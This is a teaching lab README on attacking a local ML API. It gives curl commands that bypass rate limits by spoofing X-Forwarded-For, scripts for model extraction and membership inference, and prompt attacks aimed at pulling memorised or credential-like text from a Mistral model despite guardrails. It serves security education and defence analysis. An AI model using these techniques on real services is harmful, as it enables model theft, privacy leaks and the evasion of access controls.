# Lab 06: Model Extraction & Inference Attacks

## Overview

Attack a deployed ML model API to steal its functionality and infer private information about its training data. This lab covers three categories of attacks against machine learning models:

1. **Model Extraction (Model Stealing)** -- Query the target API systematically to build a local clone that replicates its predictions without access to the original weights or training data.
2. **Membership Inference** -- Determine whether specific data points were used to train the target model by analysing confidence score distributions.
3. **Training Data Extraction** -- Attempt to recover memorised content from the LLM by exploiting known prompt patterns.

These attacks demonstrate why ML-as-a-Service APIs need more than just network-level security. The prediction outputs themselves are a leakage channel.

## Learning Objectives

- Probe an ML API to gather intelligence about the underlying model
- Bypass rate limiting through header spoofing (X-Forwarded-For)
- Perform a model extraction attack and measure extraction fidelity
- Execute a membership inference attack using confidence score analysis
- Attempt training data extraction from an LLM via prompt engineering
- Evaluate the effectiveness of current defences and propose improvements

## Architecture

```
                      ┌──────────────────────────────────┐
                      │         Attacker Machine          │
                      │                                   │
                      │  model_extraction.py              │
                      │  membership_inference.py          │
                      │  llm_extraction.py                │
                      └────────────┬──────────────────────┘
                                   │
                          HTTP (port 5000)
                                   │
                      ┌────────────▼──────────────────────┐
                      │       target-api (Flask)           │
                      │       lab06-target-api             │
                      │                                    │
                      │  POST /predict    ← Sentiment API  │
                      │  POST /chat       ← LLM endpoint   │
                      │  GET  /model-info ← Metadata leak  │
                      │  GET  /rate-limit-status ← Info    │
                      │  GET  /health                      │
                      │                                    │
                      │  ┌─────────────────────────┐       │
                      │  │ TF-IDF + LogisticRegr.  │       │
                      │  │ (Sentiment Classifier)  │       │
                      │  └─────────────────────────┘       │
                      └────────────┬───────────────────────┘
                                   │
                          HTTP (port 11434)
                                   │
                      ┌────────────▼───────────────────────┐
                      │         ollama                      │
                      │         lab06-ollama                │
                      │                                     │
                      │   mistral:7b-instruct-q4_0          │
                      │   (LLM for /chat endpoint)          │
                      │                                     │
                      │   Volume: ollama_data                │
                      └─────────────────────────────────────┘
```

## Services

| Service | Container | Port | Description |
|---------|-----------|------|-------------|
| ollama | lab06-ollama | 11434 | Ollama LLM runtime (Mistral 7B) |
| ollama-setup | lab06-ollama-setup | -- | Pulls the Mistral model on first start |
| target-api | lab06-target-api | 5000 | Flask API serving sentiment classifier + LLM chat |

## Quick Start

```bash
# Start all services
docker-compose up -d

# Wait for the model download to complete (may take several minutes)
docker-compose logs -f ollama-setup

# Verify the API is healthy
curl http://localhost:5000/health

# Check the sentiment classifier
curl -X POST http://localhost:5000/predict \
  -H "Content-Type: application/json" \
  -d '{"text": "This product is amazing!"}'

# Check the LLM chat endpoint
curl -X POST http://localhost:5000/chat \
  -H "Content-Type: application/json" \
  -d '{"message": "Hello, how are you?"}'
```

## Exercises

### Exercise 1: Reconnaissance -- Probe the Target API

Explore what information the API leaks about its internals.

```bash
# Health check -- confirms the API is running
curl http://localhost:5000/health | python3 -m json.tool

# Model info -- leaks architecture, class names, vocabulary size
# VULN: This tells the attacker exactly what surrogate to build
curl http://localhost:5000/model-info | python3 -m json.tool

# Rate limit status -- discloses the limiting mechanism
# VULN: Reveals that X-Forwarded-For is trusted for IP identification
curl http://localhost:5000/rate-limit-status | python3 -m json.tool

# Test a prediction -- note the full probability distribution in the response
# VULN: Confidence scores enable more efficient model extraction
curl -X POST http://localhost:5000/predict \
  -H "Content-Type: application/json" \
  -d '{"text": "I love this product"}' | python3 -m json.tool

# Test with different sentiments
curl -X POST http://localhost:5000/predict \
  -H "Content-Type: application/json" \
  -d '{"text": "This is terrible"}' | python3 -m json.tool

curl -X POST http://localhost:5000/predict \
  -H "Content-Type: application/json" \
  -d '{"text": "It is an average product"}' | python3 -m json.tool
```

**What to observe:**
- The /model-info endpoint reveals the exact pipeline (TF-IDF + LogisticRegression)
- Class names, vocabulary size, and ngram range are all disclosed
- Confidence scores are returned with full precision (6 decimal places)
- Rate limit status reveals the IP identification mechanism

### Exercise 2: Rate Limit Bypass -- X-Forwarded-For Spoofing

The API uses IP-based rate limiting but trusts the X-Forwarded-For header.

```bash
# Send requests until rate limit is hit (60 requests per minute)
for i in $(seq 1 65); do
  curl -s -o /dev/null -w "Request $i: %{http_code}\n" \
    -X POST http://localhost:5000/predict \
    -H "Content-Type: application/json" \
    -d '{"text": "test"}';
done

# Observe: requests 61+ return HTTP 429 (Too Many Requests)

# Check our rate limit status
curl http://localhost:5000/rate-limit-status | python3 -m json.tool

# Now bypass by spoofing X-Forwarded-For
curl -X POST http://localhost:5000/predict \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 10.0.0.99" \
  -d '{"text": "test bypassing rate limit"}' | python3 -m json.tool

# Verify: the server sees us as a different IP
curl -H "X-Forwarded-For: 10.0.0.99" \
  http://localhost:5000/rate-limit-status | python3 -m json.tool

# Each unique spoofed IP gets its own fresh rate limit bucket
for i in $(seq 1 10); do
  curl -s -X POST http://localhost:5000/predict \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.0.$i.1" \
    -d "{\"text\": \"spoofed request $i\"}" | python3 -m json.tool;
done
```

### Exercise 3: Model Extraction -- Build a Surrogate

Run the automated model extraction script.

```bash
# Run from the scripts directory or mount it into a container
cd scripts/
pip install requests numpy scikit-learn
python3 model_extraction.py
```

**What the script does:**
1. Gathers model metadata from /model-info
2. Sends 80+ diverse queries to /predict, collecting labels and confidence scores
3. Demonstrates the rate limit being triggered, then bypasses it
4. Trains a local surrogate model (TF-IDF + LogisticRegression) on the stolen data
5. Tests both models on 20 held-out texts and calculates extraction fidelity

**What to observe:**
- The surrogate achieves high fidelity (agreement with the target)
- The /model-info endpoint told the attacker exactly what architecture to use
- Rate limiting was trivially bypassed with IP spoofing
- The attacker now has a free, local copy of the "proprietary" model

### Exercise 4: Membership Inference -- Analyse Confidence Distributions

Run the membership inference attack to determine if specific samples were in the training data.

```bash
python3 membership_inference.py
```

**What the script does:**
1. Queries the target with 24 samples known to be in the training data
2. Queries with 24 novel samples definitely not in the training data
3. Compares confidence score distributions (mean, median, std, etc.)
4. Sweeps thresholds to build an optimal attack classifier
5. Reports accuracy, precision, recall, and a confusion matrix

**What to observe:**
- Training samples tend to receive higher confidence scores
- A simple threshold classifier can distinguish members from non-members
- This is a privacy attack: it reveals information about the training dataset
- The full probability distribution makes the attack easier

### Exercise 5: LLM Data Extraction -- Recover Memorised Content

Attempt to extract training data from the Mistral LLM.

```bash
python3 llm_extraction.py
```

**What the script does:**
1. **Repetition attack** -- Sends highly repetitive prompts to push the model into unusual generation states
2. **Completion attack** -- Provides beginnings of well-known texts (licenses, code headers) to test verbatim memorisation
3. **Prefix probing** -- Uses sensitive patterns (API keys, passwords, SSH keys) as prompts
4. **Persona-based attack** -- Social engineering prompts asking the model to "recall" training data

**What to observe:**
- The model may complete well-known texts (MIT License, RFC 2119 keywords) verbatim
- Repetition attacks may produce surprising or unusual outputs
- Sensitive pattern probes test if the model generates credential-like data
- Modern models have guardrails, but some prompts may partially bypass them
- Results are logged to /tmp/llm_extraction_log.json for analysis

### Exercise 6: Defence Analysis

Evaluate the defences in place and consider improvements.

```bash
# 1. Test what happens if we only get labels (no confidence scores)
# Currently the API returns full probabilities -- what if it didn't?
curl -X POST http://localhost:5000/predict \
  -H "Content-Type: application/json" \
  -d '{"text": "I love this"}' | python3 -c "
import sys, json
d = json.load(sys.stdin)
print('With probabilities:', d)
print('Without (label only):', {'prediction': d['prediction']})
print()
print('Question: How much harder is extraction with only labels?')
print('Answer: Much harder -- attacker needs ~10x more queries and')
print('        cannot train on soft labels / confidence scores.')
"

# 2. Simulate output perturbation (add noise to confidence)
python3 -c "
import numpy as np
confidence = 0.923456
print(f'Original confidence: {confidence}')
for noise_level in [0.01, 0.05, 0.10]:
    noisy = confidence + np.random.normal(0, noise_level)
    noisy = max(0, min(1, noisy))
    print(f'With noise (std={noise_level}): {noisy:.6f}')
print()
print('Output perturbation makes both extraction and membership')
print('inference harder by adding calibrated noise to scores.')
"

# 3. Think about these questions:
# - How many queries does it take to extract a model of this size?
# - What if the model had 1000 classes instead of 3?
# - How would API keys + per-account limits change the attack?
# - What monitoring could detect systematic extraction attempts?
```

## Vulnerability Summary

| # | Vulnerability | Endpoint | Impact | MITRE ATLAS |
|---|--------------|----------|--------|-------------|
| 1 | Model metadata disclosure | GET /model-info | Reveals architecture, classes, vocabulary size -- enables targeted extraction | [AML.T0044](https://atlas.mitre.org/techniques/AML.T0044) |
| 2 | Full confidence scores returned | POST /predict | Enables efficient model extraction and membership inference | [AML.T0044](https://atlas.mitre.org/techniques/AML.T0044) |
| 3 | X-Forwarded-For trusted for rate limiting | POST /predict, /chat | Attacker can spoof IPs to bypass per-IP rate limits | [AML.T0040](https://atlas.mitre.org/techniques/AML.T0040) |
| 4 | Rate limit status information disclosure | GET /rate-limit-status | Reveals rate limiting mechanism and IP identification method | [AML.T0044](https://atlas.mitre.org/techniques/AML.T0044) |
| 5 | No query pattern detection | POST /predict | Systematic extraction queries go undetected | [AML.T0042](https://atlas.mitre.org/techniques/AML.T0042) |
| 6 | LLM training data memorisation | POST /chat | Prompts can elicit memorised training content | [AML.T0024](https://atlas.mitre.org/techniques/AML.T0024) |

## Cleanup

```bash
docker-compose down -v
```

## Next Lab

Proceed to [Lab 07: AI Red Team Automation](../lab07-automation/) to build automated attack pipelines.
